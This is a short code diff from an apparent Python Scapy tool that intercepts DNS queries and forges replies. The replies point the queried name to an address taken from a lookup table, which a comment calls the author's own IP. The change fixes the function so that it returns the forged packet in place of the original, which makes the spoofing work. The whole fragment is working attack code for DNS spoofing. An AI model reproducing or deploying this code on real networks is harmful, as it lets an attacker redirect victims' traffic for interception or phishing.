@@ -90,10 +90,10 @@ def modify_packet2(packet):
         return packet
     #We set the answerfield of the response to our own IP-addres
 
-    spf_resp = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=qname, rdata=dns_map[qname])/DNSRR(rrname=qname, rdata=dns_map[qname]))
+    new_packet = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=qname, rdata=dns_map[qname])/DNSRR(rrname=qname, rdata=dns_map[qname]))
     iPrint("Modified:", qname)
     #Return the packet with the modified resonse
-    return packet
+    return new_packet
 
 
 
